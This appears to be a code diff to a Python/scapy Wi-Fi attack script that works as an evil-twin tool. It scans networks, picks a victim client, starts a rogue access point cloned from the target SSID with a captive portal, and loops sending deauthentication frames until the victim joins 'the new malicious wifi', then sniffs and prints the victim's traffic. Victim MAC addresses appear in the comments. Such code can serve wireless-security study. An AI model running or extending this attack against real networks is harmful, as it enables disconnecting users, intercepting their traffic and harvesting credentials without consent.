@@ -10,7 +10,10 @@ from user import user
 import time
 
 
-#function that get input but will keap run if it wont get input in 1 sec
+# global variables
+flag_user_enters = True
+
+#function that get input but will keep run if it wont get input in 1 sec
 def get_input(prompt, timeout):
     print(prompt)
     rlist, _, _ = select.select([sys.stdin], [], [], timeout)
@@ -19,7 +22,7 @@ def get_input(prompt, timeout):
     else:
         return None
 
-# get all adapter chanel
+# get all adapter channels
 def get_adapter_chanels(iface):
     # this comand give as all the channel in the cmd
     cmd = ["iwlist", iface, "channel"]
@@ -37,11 +40,14 @@ def get_adapter_chanels(iface):
     # Print the list of available channels
     return channels
 
+# set the adapter to monitor mode
 def set_adapter_to_monitor(iface):
     os.system(f"sudo ifconfig {iface} down")
     os.system(f"sudo iwconfig {iface} mode monitor")
     os.system(f"sudo ifconfig {iface} up")
 
+
+#
 def interface_handle_packet(pkt, network_interfaces, currchanel):
     # this is how scapy check is a wifi packet
     if pkt.haslayer(Dot11):
@@ -49,7 +55,7 @@ def interface_handle_packet(pkt, network_interfaces, currchanel):
         # as the source and destination MAC addresses, as well as the wireless management frame control field
         bssid = pkt[Dot11].addr2
         # Print the SSID and BSSID of the network
-        # if the packet is beacon we can also check the type is 0-menegment and the subtype is 8-beacon
+        # if the packet is beacon we can also check the type is 0- management and the subtype is 8-beacon
         if pkt.type == 0 and pkt.subtype == 8:
             #ssid is the name of the router
             ssid = pkt[Dot11Elt].info.decode()
@@ -83,12 +89,11 @@ def interface_handle_packet(pkt, network_interfaces, currchanel):
                     max_rate_mbps = (max_rate & 0x7F) * 0.5
                     network_interfaces.get(bssid).MB = max_rate_mbps
 
-#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+# this function gets a packet, a users list and an interface, and extract all the users from the chosen network
 def single_network_handle_packet(pkt, users_list, chosen_network_interface):
     # this is how scapy check is a wifi packet
     if pkt.haslayer(Dot11):
-        # Extract BSSID of the network this layer contain information about the network
-        # as the source and destination MAC addresses, as well as the wireless management frame control field
+        # checks if the packet's status - the from_ds & to_ds flags (0 or 1)
         to_ds = 1
         from_ds = 1
         ds = pkt.FCfield & 0x3
@@ -102,7 +107,9 @@ def single_network_handle_packet(pkt, users_list, chosen_network_interface):
             to_ds = 0
             from_ds = 1
 
+        # checks that the packet is not from ds to ds
         if to_ds != 1 or from_ds != 1:
+            # extract the bssids
             if to_ds == 0:
                 mac_address = pkt.addr1
                 bssid = pkt.addr2
@@ -110,6 +117,8 @@ def single_network_handle_packet(pkt, users_list, chosen_network_interface):
                 get_flag = 0
                 mac_address = pkt.addr2
                 bssid = pkt.addr1
+
+            # checks if the bssid is of the chosen interface
             if chosen_network_interface.BSSID == bssid:
                 if users_list.get(mac_address) is None:
                     users_list[mac_address] = user(mac_address)
@@ -121,13 +130,11 @@ def single_network_handle_packet(pkt, users_list, chosen_network_interface):
                     else:
                         users_list.get(mac_address).send_data += 1
 
-
+# this
 def handle_packets_own_network(pkt, chosen_user, wifi_mac_address):
     global flag_user_enters
     # this is how scapy check is a wifi packet
     if pkt.haslayer(Dot11):
-        # Extract BSSID of the network this layer contain information about the network
-        # as the source and destination MAC addresses, as well as the wireless management frame control field
         if pkt.type != 0 or pkt.subtype != 8:
             check_addr1 = pkt.addr1
             check_addr2 = pkt.addr2
@@ -147,6 +154,28 @@ def print_packets(pkt):
             if (check_addr1 == chosen_user and check_addr2 == wifi_mac_address) or \
                     (check_addr1 == wifi_mac_address and check_addr2 == chosen_user):
                 print(pkt)
+
+
+def start_server():
+    print(
+        "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
+
+    # setting up the captive portal
+    command_captive_portal = ['sudo', 'python3', 'captive_portal.py']
+
+    # Start the daemon process
+    process_captive_portal = subprocess.Popen(command_captive_portal, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                              stdin=subprocess.PIPE)
+
+    # Wait for the process to finish and get the output
+    output_captive_portal, error_captive_portal = process_captive_portal.communicate()
+
+    # Print the output and error messages
+    print("Output:", output_captive_portal.decode())
+    print("Errors:", error_captive_portal.decode())
+
+    print(
+        "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
 
 
 
@@ -231,23 +260,20 @@ wifi_mac_address = "c8:3a:35:c2:e0:a2"
 
 
 
-
-
-# run the ap_setup in another thread
-# thread = threading.Thread(target=setup_ap, args=(iface_wifi, wifi_channel, ssid, password))
-# thread.start()
-
-
 # 28:cd:c4:9b:87:f5  victim
 # 5c:b1:3e:ce:bd:35  wifi
 # 34:49:5b:17:a9:b4 ariel wifi
 # 24:18:1d:f7:87:c9 galaxy victim
 # 9c:30:5b:7b:26:7d
 
+# start the captive portal
+flask_thread = threading.Thread(target=start_server)
+flask_thread.start()
+
 
 # set up the access point
 # Define the command to run the ap_setup.py script
-command = ['sudo', 'python3', 'ap_setup.py', f"{chosen_network_interface.SSID}"]
+command = ['sudo', 'python3', 'ap_setup.py', f"{chosen_network_interface.SSID}", f"{chosen_network_interface.CH}"]
 
 # Start the daemon process
 process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -260,32 +286,32 @@ print("Output:", output.decode())
 print("Errors:", error.decode())
 
 
-
 # change the channel to the network che
 os.system("iwconfig %s channel %d" % (iface, chosen_network_interface.CH))
 # Create the Deauthentication frame
 deauth = RadioTap() / Dot11(addr1=chosen_user, addr2=chosen_interface, addr3=chosen_interface) / Dot11Deauth()
 # Send the frame
 
-
-while True:
+# loop until the user enters to the new malicious wifi
+while flag_user_enters:
+    # sending deauthentication packets
     sendp(deauth, iface=iface, count=30)
 
-time.sleep(1)
+    time.sleep(1)
 
-# desplay the network that was choosen
-print(f"waiting until the victim logs in :\n{chosen_network_interface}")
-print("-----------------------------------------------------------------------------------------------------------------------------")
-print(f"the victim is  : {chosen_user}")
-print(f"the interface is: {chosen_interface}")
-print(f"the channel is: {chosen_network_interface.CH}")
-print("-----------------------------------------------------------------------------------------------------------------------------")
-# change the channel to the network che
-# os.system("iwconfig %s channel %d" % (iface, wifi_channel))
-# # start to sniff packets for 3 sec
-# sniff(iface=iface, prn=lambda pkt: handle_packets_own_network(pkt, chosen_user, wifi_mac_address),
-#       timeout=3)
+    # display the network that was chosen
+    print(f"waiting until the victim logs in :\n{chosen_network_interface}")
+    print("-----------------------------------------------------------------------------------------------------------------------------")
+    print(f"the victim is  : {chosen_user}")
+    print(f"the interface is: {chosen_interface}")
+    print(f"the channel is: {chosen_network_interface.CH}")
+    print("-----------------------------------------------------------------------------------------------------------------------------")
+    # start to sniff packets for 3 sec for checking if the user log into our network if so change the flag to false
+    # and exiting the loop
+    sniff(iface=iface, prn=lambda pkt: handle_packets_own_network(pkt, chosen_user, wifi_mac_address),
+          timeout=3)
 
+# sniffing the packets from the user to our wifi, and printing them
 sniff(iface=iface, prn=lambda pkt: print_packets(pkt))
 
 
